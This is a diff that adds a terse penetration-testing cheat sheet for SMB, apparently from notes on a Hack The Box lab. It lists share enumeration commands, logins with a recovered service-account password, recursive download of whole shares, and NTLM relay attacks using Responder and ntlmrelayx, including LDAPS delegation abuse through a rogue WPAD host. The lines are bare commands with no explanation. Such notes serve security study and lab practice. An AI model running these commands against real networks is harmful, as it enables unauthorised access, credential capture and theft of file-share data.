@@ -1,0 +1,25 @@
+- smbclient -L=<IP> --option='client min protocol=NT1'
+- smbmap -H 10.10.10.100 -R
+- smbmap -H 10.10.10.100 -R Replication
+- smbmap -H 10.10.10.100
+- smbclient -L 10.10.10.100
+====================================================================================
+#session
+- smbclient \\\\10.10.10.100\\tmp
+- smbclient //10.10.10.100/tmp
+- smbmap -H 10.10.10.100 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
+- smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
+- smbclient //10.10.10.100/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18
+=====================================================================================
+# In an smbclient interactive session ->  recursively download a SMB share's content
+smb: \> prompt off
+smb: \> recurse on
+smb: \> mget *
+
+smb: \> recurse on
+smb: \> dir
+======================================================================================
+# smb relay
+sudo python Responder.py -I eth0 -wdr -v
+sudo python ntlmrelayx.py -t 192.168.64.129 -smb2support
+sudo ntlmrelayx.py -6 -t ldaps://10.0.2.16 --delegate-access -wh attacker-wpad
